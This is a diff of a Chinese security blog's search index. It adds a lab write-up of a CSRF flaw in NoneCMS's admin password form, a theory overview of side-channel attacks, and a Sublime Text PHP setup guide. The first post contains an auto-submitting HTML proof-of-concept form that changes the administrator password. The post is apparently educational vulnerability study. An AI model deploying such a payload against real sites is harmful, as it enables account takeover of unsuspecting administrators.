class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
+<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
+<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
+<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
+<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
+<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
+<h4> 参考链接</h4>
+
+<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>侧信道攻击技术学习</title>
+    <url>/2021/08/24/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>侧信道攻击(side channel attack 简称SCA)，又称边信道攻击或旁路攻击，密码学中是指绕过对加密算法的繁琐分析，利用密码算法的硬件实现的运算中泄露的信息，如执行时间、功耗、电磁辐射等，结合统计理论快速的破解密码系统。其核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。</p>
+<p>密码芯片在运算过程中会产生多种类型的泄露信息，而传统的密码分析则忽略了这些“细微”的信息对密码系统安全性的影响。这类新发现的物理泄漏信息被研究学者称为旁路信息(side-chalinelLeakage)，与之对应的攻击方法被称为旁路攻击(side-channel Attack)。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在狭义上讲，边信道攻击特指针对密码算法的非侵入式攻击，通过加密电子设备在运行过程中的边信道信息泄露破解密码算法，狭义的边信道攻击主要包括针对密码算法的计时攻击、能量分析攻击、电磁分析攻击等，这类新型攻击的有效性远高于密码分析的数学方法，因此给密码设备带来了严重的威胁。</p>
+<p>从广义上讲，针对安全设备的侵入式、半侵入式、非侵入式攻击等任何“旁门左道”的攻击方法都属于边信道攻击的范畴。广义上的边信道攻击往往脑洞大开，攻击方式也五花八门，如针对键盘敲击内容的边信道攻击有声音分析攻击、电磁分析攻击、通过WiFi信道状态进行的攻击（WiKey），以及通过内核使用状态和进程信息进行的攻击等。</p>
+<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>要成功对集成电路芯片进行旁路攻击必须满足两条： </p>
+<ul>
+<li>在泄漏的物理信号与处理的数据之间建立联系； </li>
+<li>在信息泄漏模型中处理的数据与芯片中处理的数据之间建立联系。</li>
+</ul>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>密码学中侧信道攻击的理念最早在1996年由Paul Kocher提出，此后成为密码学中一种重要的密钥恢复方法。它通过利用密码设备在运行密码算法时所泄露的电磁、功耗、声音等物理信息来进行密钥恢复。对于一些设计良好的密码算法，侧信道攻击可能是实际中恢复密钥的唯一可行办法。<br>所有的攻击类型都利用了加密/解密系统在进行加密/解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密数据。根据借助的介质或攻击者利用信息的种类，侧信道攻击分为多个大类，主要分为时间攻击、功耗分析攻击、电磁辐射攻击、故障注入攻击等。</p>
+<ul>
+<li>故障攻击/注入</li>
+</ul>
+<p>利用错误计算的结果（或考虑篡改设备上的密码系统），观察密码设备的一些错误操作，从错误行为的结果中分析推导出秘密参数。<br>错误可能导致程序或者设计错误（例如 Intel著名的FDIV错误），或者被攻击者诱导的错误（例如，能量故障，时钟故障，温度变化，离子束注入等）。</p>
+<ul>
+<li>计时攻击</li>
+</ul>
+<p>通过分析加密算法的时间执行来推导出密码，是利用密码系统的密钥与运行时间的关系来进行攻击的方法，与其它侧信道攻击相比，这种攻击方法几乎不需要什么特殊设备。<br>每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。例如：通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定数据位于哪个存储设备，或者利用通信的时间差进行数据窃取。</p>
+<ul>
+<li>功耗/能量攻击</li>
+</ul>
+<p>通过分析密码设备的能量消耗这一物理特性来恢复设备内部的秘密信息获得其密钥。<br>功耗攻击是目前最强有力的侧信道攻击手段之一，包括简单功耗分析攻击（SimplePower Analysis attacks,SPA）和差分功耗分析攻击（Differential　Power　Analysis　attacks,DPA），与传统密码分析学相比，这些攻击手段攻击效果显著。</p>
+<ul>
+<li>电磁攻击</li>
+</ul>
+<p>通过高精度电磁探头多次采集目标产品（设备）工作时泄漏电磁辐射的强度变化，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）。</p>
+<ul>
+<li>缓存攻击</li>
+</ul>
+<p>通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云主机物理主机的访问权而获取存储器的访问权。 </p>
+<ul>
+<li>其他</li>
+</ul>
+<p>基于扫描的攻击、光学辐射攻击、基于频率的攻击、组合攻击、声音攻击等。</p>
+<h3 id="能量攻击（功耗分析攻击）"><a href="#能量攻击（功耗分析攻击）" class="headerlink" title="能量攻击（功耗分析攻击）"></a>能量攻击（功耗分析攻击）</h3><p>1999 年，Kocher 等人提出了功耗分析的理念，该攻击方式是非入侵式，在攻击过程中不需要破坏密码设备，通过利用密码芯片执行过程中泄露的功耗信息来获取中间值，从而进行密钥恢复。功耗分析主要包括简单功耗分析(Simple Power Analysis，SPA)、差分功耗分析(Differential Power Analysis，DPA)、相关功耗分析(Correlation Power Analysis，CPA)等。</p>
+<ol>
+<li>简单功耗分析， SPA</li>
+</ol>
+<p>简单功耗分析是利用加密操作实现细节与功耗之间的关系，直接从测量的功耗轨迹获取密钥信息。在执行算法时，电路在不同时期处于不同的状态，比如存取数据、算术或逻辑运算等，假设将电路的运行时间分成对应不同于电路状态的时间段，那么在每个时间段中电路功耗不尽相同。SPA本质上就是从功耗轨迹（对密码设备在运算时的功耗情况进行采样所获取的曲线）上进行猜测，在一个特定时间执行了什么特定指令以及指令中设计的秘密参量。</p>
+<ol start="2">
+<li>差分功耗分析， DPA</li>
+</ol>
+<p>差分功耗分析是功耗分析中比较方便有效的一种，主要是通过利用不同的明文输入所对应的功耗曲线不同，然后结合统计分析和误差修正技术，从大量的功耗曲线中推测出密码算法中与密钥信息具有相关性的中间结果，最终实现对密码算法的破解，与简单功耗分析攻击(SPA)相比具有更高的攻击强度，对密码芯片造成的安全威胁更大。</p>
+<ol start="3">
+<li>相关功耗分析， CPA</li>
+</ol>
+<p>相关功耗分析是采用统计学的方法对模拟功耗和真实功耗进行相关系数计算。该方法首先在加密设备进行数据加密时进行实际功耗信息的测量即真实功耗，而后利用功耗攻击模型对攻击电路进行理论功耗的预测即模拟功耗，再将实测功耗与预测的理论功耗进行计算得出对应的相关系数。在猜测密钥正确的条件下，功耗攻击模型计算出预测的理论功耗与实测功耗具有很大程度上的相关性。根据相关性的大小对猜测密钥的准确率进行判断，相关系数越大，表明此时猜测密钥越接近真实密钥，反之猜测密钥与真实密钥相差越大，当相关系数为最大值时，猜测密钥即为所需的正确密钥。</p>
+<h3 id="差分故障攻击"><a href="#差分故障攻击" class="headerlink" title="差分故障攻击"></a>差分故障攻击</h3><p>差分故障攻击是将故障注入和传统的密码分析方法差分分析结合起来的一种新型侧信道攻击。<br>其核心思想是通过分析密码设备产生的正确密文和故障注入后错误密文之间的关系，从而恢复出算法的原始密钥。</p>
+<p>故障注入就是在某个合适的时间改变密码芯片的工作条件，使得密码芯片运行的中间状态发生改变，进而产生错误的输出或异常的旁路泄漏。根据攻击者侵入密码设备接口和运行环境的程度，可讲故障注入分为非侵入式故障注入、半侵入式故障注入和侵入式故障注入三种。后两种方式是基于存储数据的修改，而不是传输过程故障，所以都需要在物理上接触密码芯片，还需要昂贵的用于剖片处理的设备和化学用品，以及用于注入故障的特殊设备。而非侵入式故障注入则是通过外界干扰的方式，如时钟、电压或磁场等，让密码芯片执行出错，相比于其他两种 方式具有更高的可行性。</p>
+<h3 id="模板攻击"><a href="#模板攻击" class="headerlink" title="模板攻击"></a>模板攻击</h3><p>模板攻击就是指攻击者在目标设备的同类型设备或者其复制品上创建一个”profile”，随后利用这一”profile”快速恢复目标设备的密钥。<br>相较于CPA，模板攻击对攻击者的要求更高。模板攻击要求攻击者拥有一个和目标同样的实验设备，这个设备是攻击者可控的，能够控制输入数据且能够获取大量的能量迹。攻击者需要对目标设备的复制品具有完全的控制权，并且进行大量的前期工作以建立模板，不过，一旦模板建立，攻击者能够以很小的代价完成攻击。在模板足够好的情况下（如建模所用的能量迹数量足够大），攻击者仅需一条能量迹即可恢复密钥。</p>
+<p>模板攻击分为以下四步：</p>
+<ul>
+<li>利用一个可以完全控制的目标设备的复制品，使用不同的输入（明文和密钥）进行计算并采集曲线，确保采集的曲线足够提供给攻击者每一种密钥猜测对应的信息</li>
+<li>创建模板，模板是一种POIs(points of interest)的多元分布</li>
+<li>在目标设备上，使用少量的不同明文加密获取相应的曲线（目标设备的密钥不受攻击者控制）</li>
+<li>利用模板进行攻击，找到最可能正确的密钥猜测值</li>
+</ul>
+<p>我们也可以概括为三个主要步骤：</p>
+<ul>
+<li>兴趣点提取</li>
+<li>模板构建</li>
+<li>模板匹配</li>
+</ul>
+<p>一、 兴趣点提取：</p>
+<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%961.png" alt="兴趣点提取"></p>
+<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%962.png" alt="兴趣点提取"></p>
+<p>二、 常见模板构建策略：</p>
+<ul>
+<li>数据和密钥对模板构建</li>
+<li>中间值模板构建</li>
+<li>基于能量模型的模板构建（汉明重量）</li>
+</ul>
+<p><img src="/images/%E6%A8%A1%E6%9D%BF%E6%9E%84%E5%BB%BA.png" alt="模板构建"></p>
+<p>三、 模板匹配</p>
+<p><img src="/images/%E6%A8%A1%E6%9D%BF%E5%8C%B9%E9%85%8D.png" alt="模板匹配"></p>
+<h4> 参考链接 </h4>
+
+<ol>
+<li><a href="https://baike.baidu.com/item/%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB/1464885">旁路攻击_百度百科</a></li>
+<li><a href="https://baike.baidu.com/item/%E8%BE%B9%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/7342042?fr=aladdin">边信道攻击_百度百科</a></li>
+<li><a href="https://blog.csdn.net/weixin_46661122/article/details/109740368">关于侧信道攻击 - CSDN博客</a></li>
+<li><a href="https://www.cnblogs.com/zhuowangy2k/p/12242774.html">第三十九个知识点:侧信道攻击和故障攻击有什么区别</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>侧信道</tag>
       </tags>
   </entry>
   <entry>
@@ -1508,6 +1438,76 @@ $ hexo d # == hexo deploy 上传
       <tags>
         <tag>网络安全</tag>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sublime text3配置PHP</title>
+    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
+    <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
+<p>准备</p>
+</blockquote>
+<ul>
+<li>Sublime text 3: 可以直接到<a href="http://www.sublimetext.com/">Sublime text3官网</a>下载适合自己电脑的版本安装即可</li>
+<li>PHP: 也是到<a href="http://www.phpstudy.net/">phpstudy官网</a>下载安装即可</li>
+</ul>
+<span id="more"></span>
+
+<blockquote>
+<p>PHP安装</p>
+</blockquote>
+<p>下面进行PHP 环境变量 配置:</p>
+<p>安装好phpstudy后，进入其根目录，找到php这个文件夹会发现里面有各种版本的php，随便选择一个版本你使用就 。</p>
+<p>右键我的电脑-&gt;属性-高级系统设置-&gt;高级。找到环境变量，点击</p>
+<ol>
+<li>编辑用户变量的Path，添加你刚刚选择php版本的路径，保存</li>
+<li>编辑系统变量的Path，也是一样的做法，添加php存储 并保存</li>
+</ol>
+<p><img src="https://github.com/xinkjung/Photos/raw/master/yhpath.jpg" alt="用户"><br><img src="https://github.com/xinkjung/Photos/raw/master/xtpath.jpg" alt="系统"></p>
+<p>然后”win+R”输入cmd，进入命令提示符窗口，输入php -v ，会显示你的php版本信息，就表示配置完成了哦！！<br>（输入php -h命令也会显示相关信息）<br><img src="https://github.com/xinkjung/Photos/raw/master/php-v.jpg" alt="cmd"></p>
+<blockquote>
+<p>sublime text3配置PHP编译系统</p>
+</blockquote>
+<p>打开软件，菜单栏找到Tools-&gt;Build System-&gt;New Build System.<br>这时会弹出如下文件显示代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;shell_cmd&quot;: &quot;make&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;     </span><br><span class="line">	 &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], </span><br><span class="line">     &quot;file_regex&quot;: &quot;php$&quot;,</span><br><span class="line">     &quot;selector&quot;: &quot;source.php&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
+<p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
+<h4 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h4><blockquote>
+<p>准备</p>
+</blockquote>
+<ul>
+<li>SideBarEnhancements插件： 这是一款侧边栏增强插件，<br>“ctrl+shift+p”打开快速菜单栏，输入”pcip”，选择”install packages”回车，在搜索框内查找该插件并下载。</li>
+</ul>
+<blockquote>
+<p>配置相关文件</p>
+</blockquote>
+<p>  首先为插件指定默认浏览器，打开 “ Preference -&gt; Package Settings -&gt; Side Bar -&gt; Settings-User”,在打开的文件中输入以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &quot;default_browser&quot;: &quot;firefox&quot; //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>默认浏览器可以是列表任一，我选用的是火狐Firefox</p>
+<p>然后为插件指定默认localhost目录，在侧边栏任意文档上右键，选择”Project -&gt; Edit Preview URLs”,在文件中添加：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;F:/PHP/text/&quot;:&#123;</span><br><span class="line">        &quot;url_testing&quot;: &quot;http://localhost:81/&quot;,</span><br><span class="line">        &quot;url_production&quot;: &quot;http://xinkjung.com/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 1.”F:/PHP/text/“： 是文件在磁盘中的路径</p>
+<p> 2.”url_testing”: 本地localhost路径，请根据个人情况修改</p>
+<p> 3.”url_production”：项目线上地址（好像可以随便填）</p>
+<p> 接下来最后一步，为浏览器绑定热键，打开”Preference -&gt; Package Settings -&gt; Side Bar -&gt; key Bindings-User”，在打开的文件中添加以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;keys&quot;: [&quot;ctrl++shift+f1&quot;],</span><br><span class="line">        &quot;command&quot;: &quot;side_bar_open_in_browser&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">                    &quot;paths&quot;: [],</span><br><span class="line">                    &quot;type&quot;: &quot;testing&quot;,</span><br><span class="line">                    &quot;browser&quot;: &quot;firefox&quot;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>我使用的是”ctrl+shift+f1”，可视个人习惯而定，浏览器我选用Firefox。</p>
+<p>到此，所有就设置好啦，在页面中按相应热键，选择文件就能在设置的浏览器中浏览啦！！！</p>
+<ul>
+<li>注：一定要打开phpstudy,且文件放置在WWW目录下才可实现哦~</li>
+</ul>
+<p>附上参考链接：<br>1、<a href="https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html">https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html</a></p>
+<p>2、<a href="https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html">https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html</a></p>
+]]></content>
+      <categories>
+        <category>配置</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>Sublime text3</tag>
       </tags>
   </entry>
 </search>
